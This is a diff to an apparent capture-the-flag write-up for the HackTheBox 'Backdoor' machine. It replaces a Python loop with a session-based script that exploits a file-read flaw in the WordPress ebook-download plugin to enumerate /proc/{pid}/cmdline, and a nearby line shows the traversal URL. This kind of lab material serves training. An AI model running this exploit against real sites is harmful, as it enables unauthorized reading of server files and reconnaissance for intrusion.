@@ -2964,12 +2964,26 @@ http://target/wp-content/plugins/.../filedownload.php?ebookdownloadurl=/proc/1/c
 <pre><code class="language-python">
 import requests
 
-for i in range(1, 1000):
-    url = f"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{i}/cmdline"
-    r = requests.get(url)
-    clean = r.text.replace(f"/proc/{i}/cmdline","").replace("\\x00"," ")
-    if len(clean.strip()) > 0:
-        print(f"PID {i}: {clean}")
+BASE = "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php"
+PATH = "/proc/{pid}/cmdline"
+
+session = requests.Session()  # más rápido que requests.get repetidos
+
+for pid in range(1, 1000):
+    url = f"{BASE}?ebookdownloadurl={PATH.format(pid=pid)}"
+
+    try:
+        r = session.get(url, timeout=3)
+
+        content = r.content.strip()
+
+        if content:
+            print(f"[{pid}] {str(content)}")
+        else:
+            print(f"[{pid}] (vacío)")
+
+    except requests.RequestException as e:
+        print(f"[{pid}] ERROR → {e}")
 </code></pre>
 
 <p>Example output (revealing gdbserver running on port 1337):</p>
